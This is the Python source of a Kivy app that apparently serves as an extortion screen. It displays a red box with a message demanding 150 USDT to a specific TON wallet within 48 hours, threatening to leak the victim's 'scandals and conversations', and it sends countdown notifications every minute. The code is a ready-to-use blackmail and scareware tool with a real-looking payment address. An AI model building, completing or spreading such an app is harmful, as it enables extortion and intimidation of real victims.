from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.clock import Clock
from plyer import notification
from kivy.graphics import Color, Rectangle

class CountdownApp(App):
    def build(self):
        self.time_left = 0
        self.running = False

        # الواجهة الرئيسية
        self.root = BoxLayout(orientation='vertical', padding=20, spacing=20)

        # صندوق أحمر يحتوي على رسالة بالخط الأبيض
        self.message_box = BoxLayout(size_hint=(1, 0.6), padding=20)
        with self.message_box.canvas.before:
            Color(1, 0, 0, 1)  # اللون الأحمر
            self.rect = Rectangle(pos=self.message_box.pos, size=self.message_box.size)
            self.message_box.bind(pos=self.update_rect, size=self.update_rect)

        self.message_label = Label(text="Hi bro, don't worry, nothing has happened yet, but you have 48 hours to send 150 USDT to this cryptocurrency wallet, or I will send all your scandals and conversations to everyone you know or don't know. Send the money on this (ton) network and the address is: UQB7wop5BmicB85_eiv_azfZVFwlFUsrULNpCbSvScjpHigE", font_size=28, color=(1, 1, 1, 1))
        self.message_box.add_widget(self.message_label)

        # زر لبدء العد التنازلي
        self.start_button = Button(text='Watch the time', size_hint=(1, 0.2), font_size=20)
        self.start_button.bind(on_press=self.start_countdown)

        self.root.add_widget(self.message_box)
        self.root.add_widget(self.start_button)

        return self.root

    def update_rect(self, *args):
        self.rect.pos = self.message_box.pos
        self.rect.size = self.message_box.size

    def start_countdown(self, instance):
        if not self.running:
            self.time_left = 48 * 60 * 60  # 12 ساعة بالثواني
            self.running = True
            Clock.schedule_interval(self.update_timer, 60)  # إشعار كل دقيقة
            self.show_notification("تم بدء العداد التنازلي", "سيتم إعلامك كل دقيقة بالوقت المتبقي.")

    def update_timer(self, dt):
        if self.time_left <= 0:
            self.show_notification("الوقت انتهى", "انتهى العد التنازلي.")
            self.running = False
            return False  # إيقاف التحديث

        hours = self.time_left // 3600
        minutes = (self.time_left % 3600) // 60
        seconds = self.time_left % 60

        time_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
        self.show_notification("الوقت المتبقي", time_str)
        self.time_left -= 60  # إنقاص دقيقة

    def show_notification(self, title, message):
        try:
            notification.notify(
                title=title,
                message=message,
                timeout=5
            )
        except:
            print(f"[إشعار] تعذر إرسال الإشعار: {title} - {message}")
